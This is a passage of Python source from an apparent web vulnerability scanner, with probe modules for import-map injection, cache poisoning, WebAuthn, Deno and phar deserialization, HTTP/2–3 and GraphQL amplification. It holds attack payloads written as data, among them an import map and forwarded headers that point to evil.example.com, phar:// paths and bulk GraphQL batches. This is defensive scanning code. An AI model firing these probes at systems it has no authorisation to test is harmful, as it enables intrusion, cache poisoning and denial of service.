                            if url.startswith("http") and urlparse(surface.base_url).netloc not in url:
                                findings.append(self._add_advanced_finding(self._finding(
                                    "import_map_override",
                                    f"Import Map References External Module — {module}",
                                    WebRiskLevel.MEDIUM,
                                    0.80,
                                    surface.base_url, "importmap",
                                    f"Import map references external module '{module}' from '{url}'. "
                                    "If an attacker can inject into the import map, they can redirect "
                                    "module resolution to a malicious URL, including via SharedWorker.",
                                    f"Import map: {module} → {url}",
                                    "Host all ES modules on the same origin. "
                                    "Use Subresource Integrity (SRI) for cross-origin modules. "
                                    "Apply a CSP that restricts script-src to trusted origins. "
                                    "Never allow user input to influence import map entries.",
                                    ["https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap",
                                     "https://wicg.github.io/import-maps/"],
                                    cvss_score=6.1,
                                    module="import_map_override",
                                )))
                    except (json.JSONDecodeError, ValueError):
                        pass

            # Check for import map injection via parameters
            import_map_probe = json.dumps({"imports": {"react": "https://evil.example.com/react.js"}})
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if not re.search(r"import|module|script|src|map", param, re.I):
                        continue
                    resp = await self._get(client, url, params={param: import_map_probe})
                    if resp and "evil.example.com" in (resp.text or ""):
                        findings.append(self._add_advanced_finding(self._finding(
                            "import_map_override",
                            f"Import Map Injection via Parameter — {param}",
                            WebRiskLevel.HIGH,
                            0.78,
                            url, param,
                            "Import map JSON payload was reflected in the response, potentially "
                            "allowing an attacker to override ES module resolution with a malicious URL.",
                            f"Import map payload reflected in response for '{param}'",
                            "Sanitise and validate all import map content server-side. "
                            "Never allow user-controlled URLs in import map entries.",
                            ["https://wicg.github.io/import-maps/"],
                            cvss_score=7.5,
                            module="import_map_override",
                        )))

            # Check for SharedWorker endpoints
            for js_url in surface.js_files[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp and _IMPORT_MAP_RE.search(resp.text):
                    findings.append(self._add_advanced_finding(self._finding(
                        "import_map_override",
                        f"SharedWorker / Import Map Pattern in JS — {js_url}",
                        WebRiskLevel.LOW,
                        0.55,
                        js_url, "",
                        "JavaScript file uses SharedWorker or import map patterns that could "
                        "be abused for cross-tab module injection if an import map override is possible.",
                        f"SharedWorker/importmap pattern in {js_url}",
                        "Scope SharedWorker instances to trusted origins. "
                        "Validate all module URLs in import maps at build time.",
                        ["https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker"],
                        cvss_score=3.1,
                        module="import_map_override",
                    )))

        return findings

    # ── 13. Cache Stamping (stale-while-revalidate CDN Poisoning) ─────────

    async def run_cache_stamping_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect cache poisoning vulnerabilities via stale-while-revalidate
        directives and CDN cache key manipulation.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            # Check base URL cache headers
            resp = await self._get(client, surface.base_url)
            if resp is None:
                return findings

            cc = resp.headers.get("cache-control", "")
            vary = resp.headers.get("vary", "")
            cf_cache = resp.headers.get("cf-cache-status", "")
            x_cache = resp.headers.get("x-cache", "")

            # Detect stale-while-revalidate
            if "stale-while-revalidate" in cc:
                findings.append(self._add_advanced_finding(self._finding(
                    "cache_stamping",
                    "stale-while-revalidate Cache Policy Detected",
                    WebRiskLevel.MEDIUM,
                    0.85,
                    surface.base_url, "Cache-Control",
                    "The server uses stale-while-revalidate caching. If an attacker can poison "
                    "the cache with a malicious response during the revalidation window, the "
                    "stale poisoned response will be served to all users until revalidation.",
                    f"Cache-Control: {cc[:300]}",
                    "Ensure cache keys include all request-differentiating headers. "
                    "Validate responses before caching. "
                    "Use CDN cache purge on security incidents. "
                    "Avoid caching responses to requests with user-controlled parameters.",
                    ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control",
                     "https://portswigger.net/web-security/web-cache-poisoning"],
                    cvss_score=5.9,
                    module="cache_stamping",
                )))

            # Test cache key manipulation with unkeyed headers
            poison_headers = [
                {"X-Forwarded-Host": "evil.example.com"},
                {"X-Forwarded-Port": "443"},
                {"X-Forwarded-Scheme": "https"},
                {"X-Original-URL": "/admin"},
                {"X-Rewrite-URL": "/admin"},
            ]

            for poison_hdr in poison_headers:
                if self._check_kill():
                    break
                resp = await self._get(client, surface.base_url, headers=poison_hdr)
                if resp is None:
                    continue
                # Reflection detected — emit as POTENTIAL (validation agent will confirm or downgrade)
                poison_val  = list(poison_hdr.values())[0]
                hdr_name    = list(poison_hdr.keys())[0]
                if poison_val in (resp.text or ""):
                    findings.append(self._add_advanced_finding(self._finding(
                        "cache_stamping",
                        f"Cache Poison via Unkeyed Header — {hdr_name}",
                        WebRiskLevel.MEDIUM,   # NOT HIGH until cache hit confirmed
                        0.45,                  # low confidence until validation agent confirms
                        surface.base_url, hdr_name,
                        f"The unkeyed header '{hdr_name}: {poison_val}' was reflected in the "
                        "response body. This is a precondition for cache poisoning but is NOT "
                        "confirmed until a subsequent clean request also returns the poisoned "
                        "value (cache HIT confirmation). The validation agent will re-test.",
                        f"Header '{hdr_name}: {poison_val}' reflected in poisoned request response",
                        "Include all security-relevant headers in the cache key (Vary header). "
                        "Sanitise reflected headers before output. "
                        "Use CDN cache key normalisation to prevent host header poisoning. "
                        "Manually confirm: send clean request, check CF-Cache-Status/X-Cache.",
                        ["https://portswigger.net/web-security/web-cache-poisoning",
                         "https://owasp.org/www-community/attacks/Cache_Poisoning"],
                        cvss_score=8.0,   # potential CVSS if confirmed
                        module="cache_stamping",
                    )))

            # Check for overly permissive Vary header (or missing Vary)
            if not vary and "public" in cc:
                findings.append(self._add_advanced_finding(self._finding(
                    "cache_stamping",
                    "Public Cache Without Vary Header",
                    WebRiskLevel.LOW,
                    0.70,
                    surface.base_url, "Vary",
                    "The response is publicly cacheable but lacks a Vary header. "
                    "This may cause different users to receive the same cached response "
                    "regardless of Accept-Language, Accept-Encoding, or auth state.",
                    f"Cache-Control: {cc}, Vary: (absent)",
                    "Add Vary: Accept-Encoding (minimum) to all cacheable responses. "
                    "Add Vary: Cookie or Vary: Authorization for authenticated content.",
                    ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary"],
                    cvss_score=3.1,
                    module="cache_stamping",
                )))

        return findings

    # ── 14. WebAuthn Passkey RP ID Confusion ──────────────────────────────

    async def run_webauthn_rp_confusion_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect WebAuthn Relying Party ID confusion vulnerabilities where
        subdomain credential reuse may be possible.
        """
        findings: list[WebFinding] = []

        webauthn_endpoints = [
            "/api/webauthn/register", "/api/webauthn/authenticate",
            "/api/passkey/register", "/api/passkey/authenticate",
            "/api/auth/webauthn", "/api/fido2/register",
            "/.well-known/webauthn",
        ]

        async with self._make_client() as client:
            base = surface.base_url.rstrip("/")
            parsed = urlparse(surface.base_url)
            hostname = parsed.hostname or ""

            for ep in webauthn_endpoints:
                if self._check_kill():
                    break
                url = f"{base}{ep}"
                resp = await self._get(client, url)
                if resp is None or resp.status_code not in (200, 400, 401, 405):
                    continue

                content = resp.text[:2000] if resp.text else ""

                # Check for WebAuthn endpoint response
                if any(k in content for k in ("challenge", "rpId", "rp", "allowCredentials", "publicKey")):
                    try:
                        data = resp.json()
                    except (json.JSONDecodeError, ValueError):
                        data = {}

                    rp_id = data.get("rpId") or data.get("rp", {}).get("id", "")

                    if rp_id and rp_id != hostname:
                        findings.append(self._add_advanced_finding(self._finding(
                            "webauthn_rp_confusion",
                            f"WebAuthn RP ID Mismatch — {ep}",
                            WebRiskLevel.HIGH,
                            0.80,
                            url, "rpId",
                            f"WebAuthn endpoint returns rpId='{rp_id}' which differs from the "
                            f"actual hostname '{hostname}'. This may allow credential reuse across "
                            "subdomains (rpId is a suffix match) or RP ID confusion attacks.",
                            f"rpId='{rp_id}' vs hostname='{hostname}' at {url}",
                            "Set rpId to the exact origin hostname, not a parent domain. "
                            "Validate that rpId matches the current hostname in credential creation. "
                            "Use registrableDomainSuffix validation carefully.",
                            ["https://www.w3.org/TR/webauthn-3/#dom-publickeycredentialrpentity-id",
                             "https://portswigger.net/research/how-webauthn-could-be-broken"],
                            cvss_score=7.3,
                            module="webauthn_rp_confusion",
                        )))

                    # Check for missing or weak challenge
                    challenge = data.get("challenge", "")
                    if challenge and len(challenge) < 16:
                        findings.append(self._add_advanced_finding(self._finding(
                            "webauthn_rp_confusion",
                            f"WebAuthn Weak Challenge — {ep}",
                            WebRiskLevel.HIGH,
                            0.85,
                            url, "challenge",
                            f"WebAuthn challenge is only {len(challenge)} characters. "
                            "The WebAuthn spec requires at least 16 random bytes (128 bits). "
                            "A weak challenge enables replay attacks.",
                            f"Challenge length={len(challenge)} at {url}",
                            "Generate WebAuthn challenges using CSPRNG with at least 16 bytes. "
                            "Implement challenge expiry (typically 5 minutes).",
                            ["https://www.w3.org/TR/webauthn-3/#sctn-cryptographic-challenges"],
                            cvss_score=7.5,
                            module="webauthn_rp_confusion",
                        )))
                    elif not challenge:
                        findings.append(self._add_advanced_finding(self._finding(
                            "webauthn_rp_confusion",
                            f"WebAuthn Missing Challenge — {ep}",
                            WebRiskLevel.CRITICAL,
                            0.90,
                            url, "challenge",
                            "WebAuthn registration/authentication response does not include a challenge. "
                            "Without a challenge, replay attacks are trivially possible.",
                            f"No 'challenge' field in WebAuthn response at {url}",
                            "Always include a server-generated, one-time random challenge "
                            "in WebAuthn registration and authentication responses.",
                            ["https://www.w3.org/TR/webauthn-3/#dom-publickeycredentialrequestoptions-challenge"],
                            cvss_score=9.1,
                            module="webauthn_rp_confusion",
                        )))

                    findings.append(self._add_advanced_finding(self._finding(
                        "webauthn_rp_confusion",
                        f"WebAuthn Endpoint Discovered — {ep}",
                        WebRiskLevel.INFO,
                        0.95,
                        url, "",
                        f"WebAuthn/FIDO2 endpoint found at {url}. "
                        "Ensure proper RP ID configuration and challenge validation.",
                        f"HTTP {resp.status_code} with WebAuthn response structure at {url}",
                        "Follow WebAuthn best practices: unique challenges, correct rpId, "
                        "origin validation, and user verification enforcement.",
                        ["https://www.w3.org/TR/webauthn-3/"],
                        cvss_score=0.0,
                        module="webauthn_rp_confusion",
                    )))

        return findings

    # ── 15. Deno Node Compat Deserialization (V8 Sandbox Escape) ──────────

    async def run_deno_deserialization_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect Deno Node.js compatibility mode deserialization vulnerabilities
        that may enable V8 sandbox escape.
        """
        findings: list[WebFinding] = []

        # Deno-specific indicators and deserialization payloads
        deno_indicators = re.compile(
            r"x-deno-|deno/|deno_std|npm:node:|node:crypto|node:path|jsr:@",
            re.I,
        )

        # Node.js v8 deserialization gadget payloads (detection probes only)
        deser_endpoints = [
            "/api/deserialize", "/api/parse", "/api/import",
            "/api/eval", "/api/exec", "/api/run",
        ]

        async with self._make_client() as client:
            # Detect Deno runtime
            resp = await self._get(client, surface.base_url)
            if resp is None:
                return findings

            is_deno = (
                deno_indicators.search(str(resp.headers)) or
                any(deno_indicators.search(resp.headers.get(h, "")) for h in resp.headers)
            )

            if not is_deno:
                # Check JS files for Deno patterns
                for js_url in surface.js_files[:10]:
                    if self._check_kill():
                        break
                    js_resp = await self._get(client, js_url)
                    if js_resp and deno_indicators.search(js_resp.text or ""):
                        is_deno = True
                        break

            if is_deno:
                findings.append(self._add_advanced_finding(self._finding(
                    "deno_deserialization",
                    "Deno Runtime Detected — Node Compat Deserialization Risk",
                    WebRiskLevel.INFO,
                    0.80,
                    surface.base_url, "",
                    "Deno runtime detected. Applications using Deno's Node.js compatibility mode "
                    "with v8.deserialize() or node:v8 module may be susceptible to V8 sandbox "
                    "escape via crafted serialised payloads if accepting untrusted input.",
                    "Deno runtime patterns found in headers or JavaScript files",
                    "Avoid v8.deserialize() with untrusted input in Deno. "
                    "Prefer structured JSON serialisation over V8 serialisation. "
                    "Keep Deno runtime updated. "
                    "Review use of node:v8 module in Node compat mode.",
                    ["https://deno.land/api@latest?s=v8",
                     "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
                    cvss_score=0.0,
                    module="deno_deserialization",
                )))

            # Check for deserialization endpoints
            base = surface.base_url.rstrip("/")
            for ep in deser_endpoints:
                if self._check_kill():
                    break
                url = f"{base}{ep}"
                # Send a V8 serialization magic-byte probe (non-destructive)
                v8_magic = base64.b64encode(b"\xff\x0f" + b"\x00" * 10).decode()
                resp = await self._post(
                    client, url,
                    data={"data": v8_magic},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                if resp and resp.status_code not in (404, 405, 501):
                    deser_error_re = re.compile(
                        r"v8|deserializ|unserializ|pickle|marshal|object.*inject",
                        re.I,
                    )
                    if deser_error_re.search(resp.text or ""):
                        findings.append(self._add_advanced_finding(self._finding(
                            "deno_deserialization",
                            f"Potential Deserialization Endpoint — {ep}",
                            WebRiskLevel.HIGH,
                            0.70,
                            url, "data",
                            "Endpoint accepted a V8 serialisation magic-byte payload and returned "
                            "a response referencing serialisation terminology, suggesting it may "
                            "process deserialised data from user input.",
                            f"Deserialization keyword in response at {url}",
                            "Validate and reject binary serialised input from untrusted sources. "
                            "Use JSON Schema validation instead of native deserialisation. "
                            "Apply allowlist-based input validation.",
                            ["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
                            cvss_score=8.1,
                            module="deno_deserialization",
                        )))

        return findings

    # ── 16. HTTP/3 0-RTT Replay (Anti-Replay Window Bypass) ───────────────

    async def run_http3_0rtt_replay_tests(self, target_url: str) -> list[WebFinding]:
        """
        Detect HTTP/3 0-RTT replay vulnerabilities where the anti-replay
        window can be bypassed to replay state-changing requests.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            resp = await self._get(client, target_url)
            if resp is None:
                return findings

            alt_svc = resp.headers.get("alt-svc", "")
            early_data = resp.headers.get("early-data", "")

            if "h3" not in alt_svc and resp.http_version not in ("HTTP/3", "h3"):
                return findings

            # Server supports HTTP/3 — check for 0-RTT acceptance
            # Test if server accepts Early-Data header (indicator of 0-RTT support)
            resp_early = await self._get(
                client, target_url,
                headers={"Early-Data": "1"},
            )

            if resp_early and resp_early.status_code not in (425,):
                # Server did not return 425 Too Early — may be accepting 0-RTT
                findings.append(self._add_advanced_finding(self._finding(
                    "http3_0rtt_replay",
                    "HTTP/3 0-RTT Early Data Accepted Without 425 Rejection",
                    WebRiskLevel.MEDIUM,
                    0.70,
                    target_url, "Early-Data",
                    "Server did not return HTTP 425 Too Early when Early-Data: 1 was sent. "
                    "If the server accepts 0-RTT data on state-changing endpoints (POST/PUT/DELETE), "
                    "replayed early data may bypass anti-CSRF and anti-replay protections.",
                    f"Early-Data: 1 → HTTP {resp_early.status_code} (expected 425 for safe handling)",
                    "Return HTTP 425 Too Early for requests with Early-Data header on non-idempotent endpoints. "
                    "Implement server-side anti-replay using session tickets with limited reuse windows. "
                    "Never allow 0-RTT on POST/PUT/DELETE/PATCH endpoints.",
                    ["https://www.rfc-editor.org/rfc/rfc8470",
                     "https://www.rfc-editor.org/rfc/rfc9000#section-8"],
                    cvss_score=5.9,
                    module="http3_0rtt_replay",
                )))

            # Check for explicit 0-RTT advertisement in Alt-Svc
            if "quic" in alt_svc.lower() or "h3" in alt_svc.lower():
                findings.append(self._add_advanced_finding(self._finding(
                    "http3_0rtt_replay",
                    "HTTP/3 QUIC 0-RTT Advertised",
                    WebRiskLevel.INFO,
                    0.80,
                    target_url, "Alt-Svc",
                    "Server advertises HTTP/3 QUIC support. Verify that 0-RTT is disabled or "
                    "properly mitigated on all state-changing endpoints.",
                    f"Alt-Svc: {alt_svc[:200]}",
                    "Configure QUIC server to reject 0-RTT on non-idempotent requests. "
                    "Implement per-ticket replay window tracking.",
                    ["https://www.rfc-editor.org/rfc/rfc8470"],
                    cvss_score=0.0,
                    module="http3_0rtt_replay",
                )))

        return findings

    # ── 17. HPACK Dynamic Table Poisoning ────────────────────────────────

    async def run_hpack_poisoning_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect HPACK dynamic table poisoning vulnerabilities in HTTP/2
        header compression that may enable cross-request header leakage.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            resp = await self._get(client, surface.base_url)
            if resp is None:
                return findings

            if resp.http_version not in ("HTTP/2", "h2"):
                return findings

            # Test oversized header injection (HPACK bomb / table exhaustion)
            large_header_value = "A" * 8192
            resp_large = await self._get(
                client, surface.base_url,
                headers={
                    "X-Test-Header": large_header_value,
                    "X-Hpack-Test": "a" * 4096,
                },
            )

            if resp_large:
                if resp_large.status_code in (200, 201):
                    findings.append(self._add_advanced_finding(self._finding(
                        "hpack_poisoning",
                        "HTTP/2 HPACK — Large Headers Accepted (Table Exhaustion Risk)",
                        WebRiskLevel.MEDIUM,
                        0.65,
                        surface.base_url, "X-Test-Header",
                        "HTTP/2 server accepted very large custom headers (8KB+) without rejection. "
                        "This may allow HPACK dynamic table exhaustion or header compression "
                        "side-channel attacks that leak header values across connections.",
                        f"8192-byte header accepted → HTTP {resp_large.status_code}",
                        "Set HPACK dynamic table size limits (SETTINGS_HEADER_TABLE_SIZE). "
                        "Reject requests with individual headers exceeding 4KB. "
                        "Apply HTTP/2 header limits in your web server configuration.",
                        ["https://www.rfc-editor.org/rfc/rfc9113#section-4.3",
                         "https://portswigger.net/research/http2"],
                        cvss_score=5.3,
                        module="hpack_poisoning",
                    )))
                elif resp_large.status_code == 431:
                    # Server correctly rejects large headers
                    findings.append(self._add_advanced_finding(self._finding(
                        "hpack_poisoning",
                        "HTTP/2 HPACK — Large Header Rejection (431) Confirmed",
                        WebRiskLevel.INFO,
                        0.90,
                        surface.base_url, "X-Test-Header",
                        "Server correctly returns 431 Request Header Fields Too Large "
                        "for oversized headers, indicating proper HPACK table size enforcement.",
                        f"Large header → HTTP 431",
                        "Good. Continue enforcing header size limits consistently across all endpoints.",
                        ["https://www.rfc-editor.org/rfc/rfc9113#section-4.3"],
                        cvss_score=0.0,
                        module="hpack_poisoning",
                    )))

            # Check for header capitalisation bypass (HTTP/2 case sensitivity)
            resp_cap = await self._get(
                client, surface.base_url,
                headers={"Authorization": "Bearer test", "AUTHORIZATION": "Bearer injected"},
            )
            if resp_cap and resp_cap.status_code != 400:
                findings.append(self._add_advanced_finding(self._finding(
                    "hpack_poisoning",
                    "HTTP/2 Duplicate Header Accepted (Case Variation)",
                    WebRiskLevel.LOW,
                    0.55,
                    surface.base_url, "Authorization",
                    "HTTP/2 server accepted duplicate headers with different capitalisation "
                    "without returning 400 Bad Request. HTTP/2 requires lowercase headers; "
                    "accepting uppercase variants may indicate H2-to-H1 translation issues.",
                    f"Duplicate Authorization headers → HTTP {resp_cap.status_code}",
                    "Enforce HTTP/2 header lowercase normalisation in your proxy/server. "
                    "Reject requests with uppercase pseudo-headers or duplicate regular headers.",
                    ["https://www.rfc-editor.org/rfc/rfc9113#section-8.2"],
                    cvss_score=3.1,
                    module="hpack_poisoning",
                )))

        return findings

    # ── 18. GraphQL N+1 Amplification ────────────────────────────────────

    async def run_graphql_n_plus_one_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect GraphQL N+1 query amplification vulnerabilities that enable
        resource exhaustion via batched typename queries.
        """
        findings: list[WebFinding] = []

        graphql_endpoints = list(set(
            surface.graphql_endpoints +
            [f"{surface.base_url.rstrip('/')}{p}" for p in ["/graphql", "/api/graphql", "/gql"]]
        ))

        async with self._make_client() as client:
            for gql_url in graphql_endpoints[:5]:
                if self._check_kill():
                    break
                if gql_url.startswith("ws"):
                    continue

                # Test N+1 via deeply nested query
                deep_query = """
                {
                  __type(name: "Query") {
                    fields {
                      type {
                        fields {
                          type {
                            fields {
                              name
                              type {
                                name
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
                """
                t0 = time.monotonic()
                resp = await self._post(
                    client, gql_url,
                    json_={"query": deep_query},
                    headers={"Content-Type": "application/json"},
                )
                elapsed = time.monotonic() - t0

                if resp and resp.status_code == 200 and elapsed > 3.0:
                    findings.append(self._add_advanced_finding(self._finding(
                        "graphql_n_plus_one",
                        f"GraphQL N+1 Amplification (Deep Nesting) — {gql_url}",
                        WebRiskLevel.HIGH,
                        0.80,
                        gql_url, "query",
                        f"Deeply nested GraphQL introspection query took {elapsed:.1f}s to execute. "
                        "Without query depth limiting, an attacker can craft exponentially expensive "
                        "queries causing resource exhaustion (DoS).",
                        f"Nested __type query took {elapsed:.1f}s at {gql_url}",
                        "Implement GraphQL query depth limiting (max depth: 5-7). "
                        "Apply query complexity analysis. "
                        "Use persisted queries. "
                        "Rate-limit GraphQL requests per IP/user.",
                        ["https://graphql.org/learn/best-practices/#query-complexity",
                         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"],
                        cvss_score=7.5,
                        module="graphql_n_plus_one",
                    )))

                # Test batch query amplification
                batch_query = [{"query": '{ __typename }'}] * 100
                t0 = time.monotonic()
                resp_batch = await self._post(
                    client, gql_url,
                    json_=batch_query,
                    headers={"Content-Type": "application/json"},
                )
                elapsed_batch = time.monotonic() - t0

                if resp_batch and resp_batch.status_code == 200:
                    try:
                        batch_data = resp_batch.json()
                        if isinstance(batch_data, list) and len(batch_data) >= 50:
                            findings.append(self._add_advanced_finding(self._finding(
                                "graphql_n_plus_one",
                                f"GraphQL Batch Query Amplification — {gql_url}",
                                WebRiskLevel.HIGH,
                                0.88,
                                gql_url, "batch",
                                f"GraphQL endpoint processed a batch of 100 queries in {elapsed_batch:.1f}s. "
                                "Unrestricted batching allows attackers to amplify resource consumption "
                                "or bypass rate limiting by batching many queries in a single request.",
                                f"100-query batch returned {len(batch_data)} results at {gql_url}",
                                "Limit GraphQL batch size (max 10-20 operations per batch). "
                                "Apply per-batch rate limiting. "
                                "Consider disabling batching entirely if not required.",
                                ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"],
                                cvss_score=7.5,
                                module="graphql_n_plus_one",
                            )))
                    except (json.JSONDecodeError, ValueError):
                        pass

        return findings

    # ── 19. Prototype Pollution (structuredClone, MessageChannel) ─────────
    # (Already implemented as run_prototype_pollution_tests above, which covers
    #  structuredClone, Object.assign, lodash.merge sinks. The v5.0 module
    #  run_prototype_pollution_tests is the canonical implementation.)

    # ── 20. Phar Deserialization ──────────────────────────────────────────

    async def run_phar_deserialization_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect PHP phar:// deserialization vulnerabilities where file operations
        on user-controlled paths trigger PHP object deserialization.
        """
        findings: list[WebFinding] = []

        # Only relevant if PHP is detected
        if "PHP" not in surface.technologies and not any(
            "php" in url.lower() for url in surface.urls[:20]
        ):
            return findings

        phar_payloads = [
            "phar:///var/www/html/upload/test.jpg",
            "phar://./uploads/evil.gif",
            "phar://test.phar/test.txt",
            "compress.zlib://phar:///tmp/test.phar/x",
        ]

        phar_error_re = re.compile(
            r"phar|unserializ|__wakeup|__destruct|Phar|stream wrapper|"
            r"Deserialization|Object injection|PHP Notice.*phar",
            re.I,
        )

        # Look for file-accepting parameters
        file_params = re.compile(
            r"^(file|path|img|image|photo|avatar|logo|src|source|"
            r"url|uri|load|open|read|include|require|template)$",
            re.I,
        )

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if not file_params.match(param):
                        continue
                    for payload in phar_payloads[:3]:
                        if self._check_kill():
                            break
                        resp = await self._get(client, url, params={param: payload})
                        if resp is None:
                            continue
                        if phar_error_re.search(resp.text or ""):
                            findings.append(self._add_advanced_finding(self._finding(
                                "phar_deserialization",
                                f"PHP Phar Deserialization (Error-Based) — {param}",
                                WebRiskLevel.CRITICAL,
                                0.88,
                                url, param,
                                "A phar:// wrapper payload triggered a PHP deserialization-related "
                                "error, indicating the application uses file functions on user-supplied "
                                "paths without filtering the phar:// stream wrapper.",
                                f"Phar payload '{payload}' triggered deserialization error on '{param}'",
                                "Validate and strip stream wrapper prefixes (phar://, zip://, etc.) "
                                "from all user-supplied file paths. "
                                "Use realpath() + directory allowlist. "
                                "Disable phar stream wrapper if unused (phar.readonly=On). "
                                "Implement GC-aware gadget chain mitigations.",
                                ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection",
                                 "https://blog.ripstech.com/2018/new-php-exploitation-technique/"],
                                cvss_score=9.8,
                                module="phar_deserialization",
                            )))
                            break

            # Check for file upload + phar combination risk
            upload_forms = [
                f for f in surface.forms
                if any(i["type"] == "file" for i in f.get("inputs", []))
            ]
            if upload_forms and "PHP" in surface.technologies:
                findings.append(self._add_advanced_finding(self._finding(
                    "phar_deserialization",
                    "PHP File Upload + Phar Deserialization Risk",
                    WebRiskLevel.HIGH,
                    0.70,
                    surface.base_url, "",
                    "PHP application has both file upload forms and file-path parameters. "
                    "If uploaded files can be referenced via phar:// wrapper in file functions, "
                    "this creates a phar deserialization chain (upload gadget → phar trigger).",
                    f"PHP detected, {len(upload_forms)} upload form(s) found",
                    "Restrict file upload types to a strict allowlist (validate magic bytes). "
                    "Store uploads outside web root with randomised names. "
                    "Never pass uploaded file paths to file_exists(), fopen(), or similar functions. "
                    "Set phar.readonly=On in php.ini.",
                    ["https://blog.ripstech.com/2018/new-php-exploitation-technique/"],
                    cvss_score=8.1,
                    module="phar_deserialization",
                )))

        return findings

    # =========================================================================
    # External Tool Runners
    # =========================================================================

    async def _run_external_tools(
        self,
        url:     str,
        surface: AttackSurface,
    ) -> dict[str, Any]:
        """Run configured external tools and collect their output. Failures are isolated."""
        outputs: dict[str, Any] = {}
        tools_cfg = self._cfg.get("tools", {})
        parsed    = urlparse(url)
        host      = parsed.hostname or ""

        tasks = {}
        if tools_cfg.get("whatweb", {}).get("enabled", True):
            tasks["whatweb"] = self._run_whatweb(url)
        if tools_cfg.get("nmap", {}).get("enabled", True) and host:
            tasks["nmap"] = self._run_nmap(host, tools_cfg.get("nmap", {}).get("port_range", "80,443,8080"))
        if tools_cfg.get("nikto", {}).get("enabled", True):
            tasks["nikto"] = self._run_nikto(url)
        if tools_cfg.get("nuclei", {}).get("enabled", True):
            tasks["nuclei"] = self._run_nuclei(url)
        if tools_cfg.get("subfinder", {}).get("enabled", False) and host:
            tasks["subfinder"] = self._run_subfinder(host)
        if tools_cfg.get("gau", {}).get("enabled", False) and host:
            tasks["gau"] = self._run_gau(host)

        results = await asyncio.gather(*tasks.values(), return_exceptions=True)
        for name, result in zip(tasks.keys(), results):
            if isinstance(result, Exception):
                self._errors.append(f"tool:{name}: {result}")
                outputs[name] = {"error": str(result)}
            else:
                outputs[name] = result

        return outputs

    async def _run_tool(
        self,
        cmd:       list[str],
        timeout:   float,
        tool_name: str,
    ) -> tuple[str, str, int]:
        """
        Execute an external tool via asyncio subprocess.
        Never uses shell=True. Returns (stdout, stderr, returncode).
        """
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout = asyncio.subprocess.PIPE,
                stderr = asyncio.subprocess.PIPE,
            )
            try:
                stdout_b, stderr_b = await asyncio.wait_for(
                    proc.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                try:
                    proc.kill()
                    await proc.communicate()
                except Exception:
                    pass
                logger.warning("Tool %s timed out after %.0fs", tool_name, timeout)
                return "", f"timeout after {timeout}s", -1
            return (
                stdout_b.decode("utf-8", errors="replace"),
                stderr_b.decode("utf-8", errors="replace"),
                proc.returncode or 0,
            )
        except FileNotFoundError:
            logger.debug("Tool not available: %s", tool_name)
            return "", f"{tool_name} not found in PATH", -1
        except Exception as exc:
            logger.warning("Tool %s error: %s", tool_name, exc)
            return "", str(exc), -1

    async def _run_whatweb(self, url: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["whatweb", "--log-json=-", "--quiet", url],
            self._tool_timeout, "whatweb",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        try:
            return {"available": True, "output": json.loads(stdout)}
        except (json.JSONDecodeError, ValueError):
            return {"available": True, "raw": stdout[:2000]}

    async def _run_nmap(self, host: str, ports: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["nmap", "-sV", "--open", "-p", ports, "-oJ", "-", host],
            self._tool_timeout, "nmap",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        try:
            return {"available": True, "output": json.loads(stdout)}
        except (json.JSONDecodeError, ValueError):
            return {"available": True, "raw": stdout[:2000]}

    async def _run_nikto(self, url: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["nikto", "-h", url, "-Format", "json", "-nointeractive", "-Tuning", "x"],
            self._tool_timeout, "nikto",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        try:
            return {"available": True, "output": json.loads(stdout)}
        except (json.JSONDecodeError, ValueError):
            return {"available": True, "raw": stdout[:3000]}

    async def _run_nuclei(self, url: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["nuclei", "-u", url, "-json", "-silent", "-severity", "low,medium,high,critical"],
            self._tool_timeout, "nuclei",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        findings: list[dict[str, Any]] = []
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                findings.append(json.loads(line))
            except (json.JSONDecodeError, ValueError):
                pass
        return {"available": True, "findings": findings, "count": len(findings)}

    async def _run_katana(self, url: str) -> list[str]:
        stdout, _, rc = await self._run_tool(
            ["katana", "-u", url, "-silent", "-jc", "-depth", "3", "-jsonl"],
            self._tool_timeout, "katana",
        )
        urls: list[str] = []
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                d = json.loads(line)
                ep = d.get("request", {}).get("endpoint", "") or d.get("endpoint", "")
                if ep:
                    urls.append(ep)
            except (json.JSONDecodeError, ValueError):
                if line.startswith("http"):
